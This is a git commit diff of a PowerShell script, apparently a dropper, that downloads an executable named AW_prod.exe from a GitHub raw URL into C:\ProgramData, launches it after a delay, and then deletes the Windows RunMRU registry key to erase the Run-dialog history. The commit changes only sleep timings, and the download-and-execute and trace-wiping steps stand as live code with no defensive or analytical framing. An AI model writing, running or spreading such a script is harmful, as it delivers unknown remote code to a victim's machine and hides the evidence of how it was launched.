01329f1ddedbe7913a0bb27fa105857dc7255ec3
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2021-12-02 22:38:54 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,10 +1,9 @@
-Start-Sleep -s 10
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
 $url = 'https://github.com/qwertyuiopindia/test/blob/main/AW_prod.exe?raw=true'
 $file = "C:\ProgramData\AW_prod.exe"
 $down.DownloadFile($url,$file)
-Start-Sleep -s 30
+Start-Sleep -s 10
 $exec = New-Object -com shell.application
 $exec.shellexecute($file)
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
